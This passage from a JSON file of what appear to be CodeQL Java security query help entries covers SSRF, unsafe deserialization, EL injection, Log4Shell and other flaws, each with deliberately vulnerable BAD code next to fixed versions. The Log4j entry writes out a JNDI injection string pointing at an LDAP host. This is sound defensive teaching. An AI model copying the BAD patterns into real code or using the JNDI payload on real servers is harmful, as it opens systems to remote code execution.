(UnknownHostException uhex) {  //GOOD: Catch the subclass exception UnknownHostException of IOException.\n                uhex.printStackTrace();\n            }\n        }\n    }\n\n    // GOOD\n    {\n        public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n            String ip = \"10.100.10.81\";\n            InetAddress addr = InetAddress.getByName(ip); // OK: Hard-coded variable value or system property is not controlled by attacker.\n        }\n    }\n\n}\n```\n\n## References\n* CWE: [CWE-600: Uncaught Exception in Servlet](https://cwe.mitre.org/data/definitions/600.html)\n* SonarSource: [Exceptions should not be thrown from servlet methods](https://rules.sonarsource.com/java/tag/owasp/RSPEC-1989)\n* OWASP: [Error Handling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html)\n* Common Weakness Enumeration: [CWE-600](https://cwe.mitre.org/data/definitions/600.html).\n"
  },
  "java/tainted-permissions-check": {
    "name": "User-controlled data used in permissions check",
    "description": "Using user-controlled data in a permissions check may result in inappropriate permissions being granted.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "java/tainted-permissions-check",
    "tags": [
      "security",
      "external/cwe/cwe-807",
      "external/cwe/cwe-290"
    ],
    "filename": "6c70950b-TaintedPermissionsCheck",
    "language": "java",
    "help": "# User-controlled data used in permissions check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nThis example, using the Apache Shiro security framework, shows two ways to specify the permissions to check. The first way uses a string, `whatDoTheyWantToDo`, to specify the permissions to check. However, this string is built from user input. This can allow an attacker to force a check against a permission that they know they have, rather than the permission that should be checked. For example, while trying to access the account details of another user, the attacker could force the system to check whether they had permissions to access their *own* account details, which is incorrect, and would allow them to perform the action. The second, more secure way uses a fixed check that does not depend on data that is controlled by the user.\n\n\n```java\npublic static void main(String[] args) {\n\tString whatDoTheyWantToDo = args[0];\n\tSubject subject = SecurityUtils.getSubject();\n\n\t// BAD: permissions decision made using tainted data\n\tif(subject.isPermitted(\"domain:sublevel:\" + whatDoTheyWantToDo))\n\t\tdoIt();\n\n\t// GOOD: use fixed checks\n\tif(subject.isPermitted(\"domain:sublevel:whatTheMethodDoes\"))\n\t\tdoIt();\n}\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [SEC02-J. Do not base security checks on untrusted sources](https://wiki.sei.cmu.edu/confluence/display/java/SEC02-J.+Do+not+base+security+checks+on+untrusted+sources).\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n"
  },
  "java/ssrf": {
    "name": "Server-side request forgery",
    "description": "Making web requests based on unvalidated user-input may cause the server to communicate with malicious servers.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "high",
    "id": "java/ssrf",
    "tags": [
      "security",
      "external/cwe/cwe-918"
    ],
    "filename": "13fe2af9-RequestForgery",
    "language": "java",
    "help": "# Server-side request forgery\nDirectly incorporating user input into an HTTP request without validating the input can facilitate server-side request forgery (SSRF) attacks. In these attacks, the server may be tricked into making a request and interacting with an attacker-controlled server.\n\n\n## Recommendation\nTo guard against SSRF attacks, you should avoid putting user-provided input directly into a request URL. Instead, maintain a list of authorized URLs on the server; then choose from that list based on the input provided. Alternatively, ensure requests constructed from user input are limited to a particular host or more restrictive URL prefix.\n\n\n## Example\nThe following example shows an HTTP request parameter being used directly to form a new request without validating the input, which facilitates SSRF attacks. It also shows how to remedy the problem by validating the user input against a known fixed string.\n\n\n```java\nimport java.net.http.HttpClient;\n\npublic class SSRF extends HttpServlet {\n\tprivate static final String VALID_URI = \"http://lgtm.com\";\n\tprivate HttpClient client = HttpClient.newHttpClient();\n\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response)\n\t\tthrows ServletException, IOException {\n\t\tURI uri = new URI(request.getParameter(\"uri\"));\n\t\t// BAD: a request parameter is incorporated without validation into a Http request\n\t\tHttpRequest r = HttpRequest.newBuilder(uri).build();\n\t\tclient.send(r, null);\n\n\t\t// GOOD: the request parameter is validated against a known fixed string\n\t\tif (VALID_URI.equals(request.getParameter(\"uri\"))) {\n\t\t\tHttpRequest r2 = HttpRequest.newBuilder(uri).build();\n\t\t\tclient.send(r2, null);\n\t\t}\n\t}\n}\n\n```\n\n## References\n* [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)\n* Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).\n"
  },
  "java/local-temp-file-or-directory-information-disclosure": {
    "name": "Local information disclosure in a temporary directory",
    "description": "Writing information without explicit permissions to a shared temporary directory may disclose it to other users.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.5,
    "precision": "medium",
    "id": "java/local-temp-file-or-directory-information-disclosure",
    "tags": [
      "security",
      "external/cwe/cwe-200",
      "external/cwe/cwe-732"
    ],
    "filename": "c79ca7dc-TempDirLocalInformationDisclosure",
    "language": "java",
    "help": "# Local information disclosure in a temporary directory\nLocal information disclosure can occur when files/directories are written into directories that are shared between all users on the system.\n\nOn most [unix-like](https://en.wikipedia.org/wiki/Unix-like) systems, the system temporary directory is shared between local users. If files/directories are created within the system temporary directory without using APIs that explicitly set the correct file permissions, local information disclosure can occur.\n\nDepending upon the particular file contents exposed, this vulnerability can have a [CVSSv3.1 base score of 6.2/10](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N&version=3.1).\n\n\n## Recommendation\nUse JDK methods that specifically protect against this vulnerability:\n\n* [java.nio.file.Files.createTempDirectory](https://docs.oracle.com/javase/8/docs/api/java/nio/file/Files.html#createTempDirectory-java.nio.file.Path-java.lang.String-java.nio.file.attribute.FileAttribute...-)\n* [java.nio.file.Files.createTempFile](https://docs.oracle.com/javase/8/docs/api/java/nio/file/Files.html#createTempFile-java.nio.file.Path-java.lang.String-java.lang.String-java.nio.file.attribute.FileAttribute...-)\nOtherwise, create the file/directory by manually specifying the expected posix file permissions. For example: `PosixFilePermissions.asFileAttribute(EnumSet.of(PosixFilePermission.OWNER_READ, PosixFilePermission.OWNER_WRITE))`\n\n* [java.nio.file.Files.createFile](https://docs.oracle.com/javase/8/docs/api/java/nio/file/Files.html#createFile-java.nio.file.Path-java.nio.file.attribute.FileAttribute...-)\n* [java.nio.file.Files.createDirectory](https://docs.oracle.com/javase/8/docs/api/java/nio/file/Files.html#createDirectory-java.nio.file.Path-java.nio.file.attribute.FileAttribute...-)\n* [java.nio.file.Files.createDirectories](https://docs.oracle.com/javase/8/docs/api/java/nio/file/Files.html#createDirectories-java.nio.file.Path-java.nio.file.attribute.FileAttribute...-)\n\n## Example\nIn the following example, files and directories are created with file permissions that allow other local users to read their contents.\n\n\n```java\nimport java.io.File;\n\npublic class TempDirUsageVulnerable {\n    void exampleVulnerable() {\n        File temp1 = File.createTempFile(\"random\", \".txt\"); // BAD: File has permissions `-rw-r--r--`\n\n        File temp2 = File.createTempFile(\"random\", \"file\", null); // BAD: File has permissions `-rw-r--r--`\n\n        File systemTempDir = new File(System.getProperty(\"java.io.tmpdir\"));\n        File temp3 = File.createTempFile(\"random\", \"file\", systemTempDir); // BAD: File has permissions `-rw-r--r--`\n\n        File tempDir = com.google.common.io.Files.createTempDir(); // BAD: CVE-2020-8908: Directory has permissions `drwxr-xr-x`\n\n        new File(System.getProperty(\"java.io.tmpdir\"), \"/child\").mkdir(); // BAD: Directory has permissions `-rw-r--r--`\n\n        File tempDirChildFile = new File(System.getProperty(\"java.io.tmpdir\"), \"/child-create-file.txt\");\n        Files.createFile(tempDirChildFile.toPath()); // BAD: File has permissions `-rw-r--r--`\n\n        File tempDirChildDir = new File(System.getProperty(\"java.io.tmpdir\"), \"/child-dir\");\n        tempDirChildDir.mkdir(); // BAD: Directory has permissions `drwxr-xr-x`\n        Files.createDirectory(tempDirChildDir.toPath()); // BAD: Directory has permissions `drwxr-xr-x`\n    }\n}\n\n```\nIn the following example, files and directories are created with file permissions that protect their contents.\n\n\n```java\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.nio.file.attribute.PosixFilePermissions;\n\nimport java.util.EnumSet;\n\n\npublic class TempDirUsageSafe {\n    void exampleSafe() throws IOException {\n        Path temp1 = Files.createTempFile(\"random\", \".txt\"); // GOOD: File has permissions `-rw-------`\n\n        Path temp2 = Files.createTempDirectory(\"random-directory\"); // GOOD: File has permissions `drwx------`\n\n        // Creating a temporary file with a non-randomly generated name\n        File tempChildFile = new File(System.getProperty(\"java.io.tmpdir\"), \"/child-create-file.txt\");\n        // Warning: This will fail on windows as it doesn't support PosixFilePermissions.\n        // See `exampleSafeWithWindowsSupportFile` if your code needs to support windows and unix-like systems.\n        Files.createFile(\n            tempChildFile.toPath(),\n            PosixFilePermissions.asFileAttribute(EnumSet.of(PosixFilePermission.OWNER_READ, PosixFilePermission.OWNER_WRITE))\n        ); // GOOD: Good has permissions `-rw-------`\n    }\n\n    /*\n     * An example of a safe use of createFile or createDirectory if your code must support windows and unix-like systems.\n     */\n    void exampleSafeWithWindowsSupportFile() {\n        // Creating a temporary file with a non-randomly generated name\n        File tempChildFile = new File(System.getProperty(\"java.io.tmpdir\"), \"/child-create-file.txt\");\n        createTempFile(tempChildFile.toPath()); // GOOD: Good has permissions `-rw-------`\n    }\n\n    static void createTempFile(Path tempDirChild) {\n        try {\n            if (tempDirChild.getFileSystem().supportedFileAttributeViews().contains(\"posix\")) {\n                // Explicit permissions setting is only required on unix-like systems because\n                // the temporary directory is shared between all users.\n                // This is not necessary on Windows, each user has their own temp directory\n                final EnumSet<PosixFilePermission> posixFilePermissions =\n                        EnumSet.of(\n                            PosixFilePermission.OWNER_READ,\n                            PosixFilePermission.OWNER_WRITE\n                        );\n                if (!Files.exists(tempDirChild)) {\n                    Files.createFile(\n                        tempDirChild,\n                        PosixFilePermissions.asFileAttribute(posixFilePermissions)\n                    ); // GOOD: Directory has permissions `-rw-------`\n                } else {\n                    Files.setPosixFilePermissions(\n                            tempDirChild,\n                            posixFilePermissions\n                    ); // GOOD: Good has permissions `-rw-------`, or will throw an exception if this fails\n                }\n            } else if (!Files.exists(tempDirChild)) {\n                // On Windows, we still need to create the directory, when it doesn't already exist.\n                Files.createDirectory(tempDirChild); // GOOD: Windows doesn't share the temp directory between users\n            }\n        } catch (IOException exception) {\n            throw new UncheckedIOException(\"Failed to create temp file\", exception);\n        }\n    }\n\n    void exampleSafeWithWindowsSupportDirectory() {\n        File tempDirChildDir = new File(System.getProperty(\"java.io.tmpdir\"), \"/child-dir\");\n        createTempDirectories(tempDirChildDir.toPath()); // GOOD: Directory has permissions `drwx------`\n    }\n\n    static void createTempDirectories(Path tempDirChild) {\n        try {\n            if (tempDirChild.getFileSystem().supportedFileAttributeViews().contains(\"posix\")) {\n                // Explicit permissions setting is only required on unix-like systems because\n                // the temporary directory is shared between all users.\n                // This is not necessary on Windows, each user has their own temp directory\n                final EnumSet<PosixFilePermission> posixFilePermissions =\n                        EnumSet.of(\n                            PosixFilePermission.OWNER_READ,\n                            PosixFilePermission.OWNER_WRITE,\n                            PosixFilePermission.OWNER_EXECUTE\n                        );\n                if (!Files.exists(tempDirChild)) {\n                    Files.createDirectories(\n                        tempDirChild,\n                        PosixFilePermissions.asFileAttribute(posixFilePermissions)\n                    ); // GOOD: Directory has permissions `drwx------`\n                } else {\n                    Files.setPosixFilePermissions(\n                            tempDirChild,\n                            posixFilePermissions\n                    ); // GOOD: Good has permissions `drwx------`, or will throw an exception if this fails\n                }\n            } else if (!Files.exists(tempDirChild)) {\n                // On Windows, we still need to create the directory, when it doesn't already exist.\n                Files.createDirectories(tempDirChild); // GOOD: Windows doesn't share the temp directory between users\n            }\n        } catch (IOException exception) {\n            throw new UncheckedIOException(\"Failed to create temp dir\", exception);\n        }\n    }\n}\n\n```\n\n## References\n* OWASP: [Insecure Temporary File](https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File).\n* CERT: [FIO00-J. Do not operate on files in shared directories](https://wiki.sei.cmu.edu/confluence/display/java/FIO00-J.+Do+not+operate+on+files+in+shared+directories).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n* Common Weakness Enumeration: [CWE-732](https://cwe.mitre.org/data/definitions/732.html).\n"
  },
  "java/unsafe-deserialization": {
    "name": "Deserialization of user-controlled data",
    "description": "Deserializing user-controlled data may allow attackers to execute arbitrary code.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "java/unsafe-deserialization",
    "tags": [
      "security",
      "external/cwe/cwe-502"
    ],
    "filename": "a3c84ba8-UnsafeDeserialization",
    "language": "java",
    "help": "# Deserialization of user-controlled data\nDeserializing untrusted data using any deserialization framework that allows the construction of arbitrary serializable objects is easily exploitable and in many cases allows an attacker to execute arbitrary code. Even before a deserialized object is returned to the caller of a deserialization method a lot of code may have been executed, including static initializers, constructors, and finalizers. Automatic deserialization of fields means that an attacker may craft a nested combination of objects on which the executed initialization code may have unforeseen effects, such as the execution of arbitrary code.\n\nThere are many different serialization frameworks. This query currently supports Kryo, XmlDecoder, XStream, SnakeYaml, JYaml, JsonIO, YAMLBeans, HessianBurlap, Castor, Burlap, Jackson, Jabsorb, Jodd JSON, Flexjson, Gson, JMS, and Java IO serialization through `ObjectInputStream`/`ObjectOutputStream`.\n\n\n## Recommendation\nAvoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML. However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.\n\nAlternatively, a tightly controlled whitelist can limit the vulnerability of code, but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.\n\nRecommendations specific to particular frameworks supported by this query:\n\n**FastJson** - `com.alibaba:fastjson`\n\n* **Secure by Default**: Partially\n* **Recommendation**: Call `com.alibaba.fastjson.parser.ParserConfig#setSafeMode` with the argument `true` before deserializing untrusted data.\n\n\n**FasterXML** - `com.fasterxml.jackson.core:jackson-databind`\n\n* **Secure by Default**: Yes\n* **Recommendation**: Don't call `com.fasterxml.jackson.databind.ObjectMapper#enableDefaultTyping` and don't annotate any object fields with `com.fasterxml.jackson.annotation.JsonTypeInfo` passing either the `CLASS` or `MINIMAL_CLASS` values to the annotation. Read [this guide](https://cowtowncoder.medium.com/jackson-2-10-safe-default-typing-2d018f0ce2ba).\n\n\n**Kryo** - `com.esotericsoftware:kryo` and `com.esotericsoftware:kryo5`\n\n* **Secure by Default**: Yes for `com.esotericsoftware:kryo5` and for `com.esotericsoftware:kryo` &gt;= v5.0.0\n* **Recommendation**: Don't call `com.esotericsoftware.kryo(5).Kryo#setRegistrationRequired` with the argument `false` on any `Kryo` instance that may deserialize untrusted data.\n\n\n**ObjectInputStream** - `Java Standard Library`\n\n* **Secure by Default**: No\n* **Recommendation**: Use a validating input stream, such as `org.apache.commons.io.serialization.ValidatingObjectInputStream`.\n\n\n**SnakeYAML** - `org.yaml:snakeyaml`\n\n* **Secure by Default**: No\n* **Recommendation**: Pass an instance of `org.yaml.snakeyaml.constructor.SafeConstructor` to `org.yaml.snakeyaml.Yaml`'s constructor before using it to deserialize untrusted data.\n\n\n**XML Decoder** - `Standard Java Library`\n\n* **Secure by Default**: No\n* **Recommendation**: Do not use with untrusted user input.\n\n\n**ObjectMesssage** - `Java EE/Jakarta EE`\n\n* **Secure by Default**: Depends on the JMS implementation.\n* **Recommendation**: Do not use with untrusted user input.\n\n\n\n## Example\nThe following example calls `readObject` directly on an `ObjectInputStream` that is constructed from untrusted data, and is therefore inherently unsafe.\n\n\n```java\npublic MyObject {\n  public int field;\n  MyObject(int field) {\n    this.field = field;\n  }\n}\n\npublic MyObject deserialize(Socket sock) {\n  try(ObjectInputStream in = new ObjectInputStream(sock.getInputStream())) {\n    return (MyObject)in.readObject(); // unsafe\n  }\n}\n\n```\nRewriting the communication protocol to only rely on reading primitive types from the input stream removes the vulnerability.\n\n\n```java\npublic MyObject deserialize(Socket sock) {\n  try(DataInputStream in = new DataInputStream(sock.getInputStream())) {\n    return new MyObject(in.readInt());\n  }\n}\n\n```\n\n## References\n* OWASP vulnerability description: [Deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data).\n* OWASP guidance on deserializing objects: [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).\n* Talks by Chris Frohoff &amp; Gabriel Lawrence: [ AppSecCali 2015: Marshalling Pickles - how deserializing objects will ruin your day](http://frohoff.github.io/appseccali-marshalling-pickles/), [OWASP SD: Deserialize My Shorts: Or How I Learned to Start Worrying and Hate Java Object Deserialization](http://frohoff.github.io/owaspsd-deserialize-my-shorts/).\n* Alvaro Mu\u00f1oz &amp; Christian Schneider, RSAConference 2016: [Serial Killer: Silently Pwning Your Java Endpoints](https://speakerdeck.com/pwntester/serial-killer-silently-pwning-your-java-endpoints).\n* SnakeYaml documentation on deserialization: [SnakeYaml deserialization](https://bitbucket.org/snakeyaml/snakeyaml/wiki/Documentation#markdown-header-loading-yaml).\n* Hessian deserialization and related gadget chains: [Hessian deserialization](https://paper.seebug.org/1137/).\n* Castor and Hessian java deserialization vulnerabilities: [Castor and Hessian deserialization](https://securitylab.github.com/research/hessian-java-deserialization-castor-vulnerabilities/).\n* Remote code execution in JYaml library: [JYaml deserialization](https://www.cybersecurity-help.cz/vdb/SB2020022512).\n* JsonIO deserialization vulnerabilities: [JsonIO deserialization](https://klezvirus.github.io/Advanced-Web-Hacking/Serialisation/).\n* Research by Moritz Bechler: [Java Unmarshaller Security - Turning your data into code execution](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)\n* Blog posts by the developer of Jackson libraries: [On Jackson CVEs: Don\u2019t Panic \u2014 Here is what you need to know](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062) [Jackson 2.10: Safe Default Typing](https://cowtowncoder.medium.com/jackson-2-10-safe-default-typing-2d018f0ce2ba)\n* Jabsorb documentation on deserialization: [Jabsorb JSON Serializer](https://github.com/Servoy/jabsorb/blob/master/src/org/jabsorb/).\n* Jodd JSON documentation on deserialization: [JoddJson Parser](https://json.jodd.org/parser).\n* RCE in Flexjson: [Flexjson deserialization](https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html).\n* Android Intent deserialization vulnerabilities with GSON parser: [Insecure use of JSON parsers](https://blog.oversecured.com/Exploiting-memory-corruption-vulnerabilities-on-Android/#insecure-use-of-json-parsers).\n* Research by Matthias Kaiser: [Pwning Your Java Messaging With Deserialization Vulnerabilities](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf).\n* Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).\n"
  },
  "java/main-method-in-enterprise-bean": {
    "name": "Main Method in Enterprise Java Bean",
    "description": "Java EE applications with a main method.",
    "kind": "problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/main-method-in-enterprise-bean",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-489"
    ],
    "filename": "41baf539-EJBMain",
    "language": "java",
    "help": "# Main Method in Enterprise Java Bean\nDebug code can create unintended entry points in a deployed Java EE web application therefore should never make into production. There is no reason to have a main method in a Java EE web application. Having a main method in the Java EE application increases the attack surface that an attacker can exploit to attack the application logic.\n\n\n## Recommendation\nRemove the main method from enterprise beans.\n\n\n## Example\nThe following example shows two ways of implementing enterprise beans. In the 'BAD' case, a main method is implemented. In the 'GOOD' case, no main method is implemented.\n\n\n```java\npublic class EJBMain implements SessionBean {\n    /**\n     * Create the session bean (empty implementation)\n     */\n    public void ejbCreate() throws javax.ejb.CreateException {\n        System.out.println(\"EJBMain:ejbCreate()\");\n    }\n\n    public void ejbActivate() throws javax.ejb.EJBException, java.rmi.RemoteException {\n    }\n\n    public void ejbPassivate() throws javax.ejb.EJBException, java.rmi.RemoteException {\n    }\n\n    public void ejbRemove() throws javax.ejb.EJBException, java.rmi.RemoteException {\n    }\n\n    public void setSessionContext(SessionContext parm1) throws javax.ejb.EJBException, java.rmi.RemoteException {\n    }\n\n    public String doService() {\n        return null;\n    }\n\n    // BAD - Implement a main method in session bean.\n    public static void main(String[] args) throws Exception {\n        EJBMain b = new EJBMain();\n        b.doService();\n    }\n\n    // GOOD - Not to have a main method in session bean.\n}\n\n```\n\n## References\n* SonarSource: [Web applications should not have a \"main\" method](https://rules.sonarsource.com/java/tag/owasp/RSPEC-2653)\n* Carnegie Mellon University: [ENV06-J. Production code must not contain debugging entry points](https://wiki.sei.cmu.edu/confluence/display/java/ENV06-J.+Production+code+must+not+contain+debugging+entry+points)\n* Common Weakness Enumeration: [CWE-489](https://cwe.mitre.org/data/definitions/489.html).\n"
  },
  "java/insecure-bean-validation": {
    "name": "Insecure Bean Validation",
    "description": "User-controlled data may be evaluated as a Java EL expression, leading to arbitrary code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "java/insecure-bean-validation",
    "tags": [
      "security",
      "external/cwe/cwe-094"
    ],
    "filename": "b76141d8-InsecureBeanValidation",
    "language": "java",
    "help": "# Insecure Bean Validation\nCustom error messages for constraint validators support different types of interpolation, including [Java EL expressions](https://docs.jboss.org/hibernate/validator/5.1/reference/en-US/html/chapter-message-interpolation.html#section-interpolation-with-message-expressions). Controlling part of the message template being passed to `ConstraintValidatorContext.buildConstraintViolationWithTemplate()` argument can lead to arbitrary Java code execution. Unfortunately, it is common that validated (and therefore, normally untrusted) bean properties flow into the custom error message.\n\n\n## Recommendation\nThere are different approaches to remediate the issue:\n\n* Do not include validated bean properties in the custom error message.\n* Use parameterized messages instead of string concatenation. For example:\n```\nHibernateConstraintValidatorContext context =\n   constraintValidatorContext.unwrap(HibernateConstraintValidatorContext.class);\ncontext.addMessageParameter(\"foo\", \"bar\");\ncontext.buildConstraintViolationWithTemplate(\"My violation message contains a parameter {foo}\")\n   .addConstraintViolation();\n```\n* Sanitize the validated bean properties to make sure that there are no EL expressions. An example of valid sanitization logic can be found [here](https://github.com/hibernate/hibernate-validator/blob/master/engine/src/main/java/org/hibernate/validator/internal/engine/messageinterpolation/util/InterpolationHelper.java#L17).\n* Disable the EL interpolation and only use `ParameterMessageInterpolator`:\n```\nValidator validator = Validation.byDefaultProvider()\n   .configure()\n   .messageInterpolator(new ParameterMessageInterpolator())\n   .buildValidatorFactory()\n   .getValidator();\n```\n* Replace Hibernate Validator with Apache BVal, which in its latest version does not interpolate EL expressions by default. Note that this replacement may not be a simple drop-in replacement.\n\n## Example\nThe following validator could result in arbitrary Java code execution:\n\n\n```java\nimport javax.validation.ConstraintValidator;\nimport javax.validation.ConstraintValidatorContext;\nimport org.hibernate.validator.constraintvalidation.HibernateConstraintValidatorContext;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class TestValidator implements ConstraintValidator<Object, String> {\n\n    public static class InterpolationHelper {\n\n        public static final char BEGIN_TERM = '{';\n        public static final char END_TERM = '}';\n        public static final char EL_DESIGNATOR = '$';\n        public static final char ESCAPE_CHARACTER = '\\\\';\n\n        private static final Pattern ESCAPE_MESSAGE_PARAMETER_PATTERN = Pattern.compile( \"([\\\\\" + ESCAPE_CHARACTER + BEGIN_TERM + END_TERM + EL_DESIGNATOR + \"])\" );\n\n        private InterpolationHelper() {\n        }\n\n        public static String escapeMessageParameter(String messageParameter) {\n            if ( messageParameter == null ) {\n                return null;\n            }\n            return ESCAPE_MESSAGE_PARAMETER_PATTERN.matcher( messageParameter ).replaceAll( Matcher.quoteReplacement( String.valueOf( ESCAPE_CHARACTER ) ) + \"$1\" );\n        }\n\n    }\n\n    @Override\n    public boolean isValid(String object, ConstraintValidatorContext constraintContext) {\n        String value = object + \" is invalid\";\n\n        // Bad: Bean properties (normally user-controlled) are passed directly to `buildConstraintViolationWithTemplate`\n        constraintContext.buildConstraintViolationWithTemplate(value).addConstraintViolation().disableDefaultConstraintViolation();\n\n        // Good: Bean properties (normally user-controlled) are escaped \n        String escaped = InterpolationHelper.escapeMessageParameter(value);\n        constraintContext.buildConstraintViolationWithTemplate(escaped).addConstraintViolation().disableDefaultConstraintViolation();\n\n        // Good: Bean properties (normally user-controlled) are parameterized\n        HibernateConstraintValidatorContext context = constraintContext.unwrap( HibernateConstraintValidatorContext.class );\n        context.addMessageParameter( \"prop\", object );\n        context.buildConstraintViolationWithTemplate( \"{prop} is invalid\").addConstraintViolation();\n        return false;\n    }\n\n}\n\n```\n\n## References\n* Hibernate Reference Guide: [ConstraintValidatorContext](https://docs.jboss.org/hibernate/stable/validator/reference/en-US/html_single/#_the_code_constraintvalidatorcontext_code).\n* GitHub Security Lab research: [Bean validation](https://securitylab.github.com/research/bean-validation-RCE).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "java/log4j-injection": {
    "name": "Potential Log4J LDAP JNDI injection (CVE-2021-44228)",
    "description": "Building Log4j log entries from user-controlled data may allow attackers to inject malicious code through JNDI lookups when using Log4J versions vulnerable to CVE-2021-44228.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/log4j-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-020",
      "external/cwe/cwe-074",
      "external/cwe/cwe-400",
      "external/cwe/cwe-502"
    ],
    "filename": "2f5457cb-Log4jJndiInjection",
    "language": "java",
    "help": "# Potential Log4J LDAP JNDI injection (CVE-2021-44228)\nThis query flags up situations in which untrusted user data is included in Log4j messages. If an application uses a Log4j version prior to 2.15.0, using untrusted user data in log messages will make an application vulnerable to remote code execution through Log4j's LDAP JNDI parser (CVE-2021-44228).\n\nAs per Apache's Log4j security guide: Apache Log4j2 &lt;=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From Log4j 2.15.0, this behavior has been disabled by default. Note that this query will not try to determine which version of Log4j is used.\n\n\n## Recommendation\nThis issue was remediated in Log4j v2.15.0. The Apache Logging Services team provides the following mitigation advice:\n\nIn previous releases (&gt;=2.10) this behavior can be mitigated by setting system property `log4j2.formatMsgNoLookups` to `true` or by removing the `JndiLookup` class from the classpath (example: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`).\n\nYou can manually check for use of affected versions of Log4j by searching your project repository for Log4j use, which is often in a pom.xml file.\n\nWhere possible, upgrade to Log4j version 2.15.0. If you are using Log4j v1 there is a migration guide available.\n\nPlease note that Log4j v1 is End Of Life (EOL) and will not receive patches for this issue. Log4j v1 is also vulnerable to other RCE vectors and we recommend you migrate to Log4j 2.15.0 where possible.\n\nIf upgrading is not possible, then ensure the -Dlog4j2.formatMsgNoLookups=true system property is set on both client- and server-side components.\n\n\n## Example\nIn this example, a username, provided by the user, is logged using `logger.warn` (from `org.apache.logging.log4j.Logger`). If a malicious user provides `${jndi:ldap://127.0.0.1:1389/a}` as a username parameter, Log4j will make a JNDI lookup on the specified LDAP server and potentially load arbitrary code.\n\n\n```java\npackage com.example.restservice;\n\nimport org.apache.commons.logging.log4j.Logger;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\npublic class Log4jJndiInjection {\n\n    private final Logger logger = LogManager.getLogger();\n\n    @GetMapping(\"/bad\")\n    public String bad(@RequestParam(value = \"username\", defaultValue = \"name\") String username) {\n        logger.warn(\"User:'{}'\", username);\n        return username;\n    }\n}\n\n```\n\n## References\n* GitHub Advisory Database: [Remote code injection in Log4j](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-74](https://cwe.mitre.org/data/definitions/74.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n* Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).\n"
  },
  "java/android/fragment-injection": {
    "name": "Android fragment injection",
    "description": "Instantiating an Android fragment from a user-provided value may allow a malicious application to bypass access controls,  exposing the application to unintended effects.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "java/android/fragment-injection",
    "tags": [
      "security",
      "external/cwe/cwe-470"
    ],
    "filename": "2ad411f3-FragmentInjection",
    "language": "java",
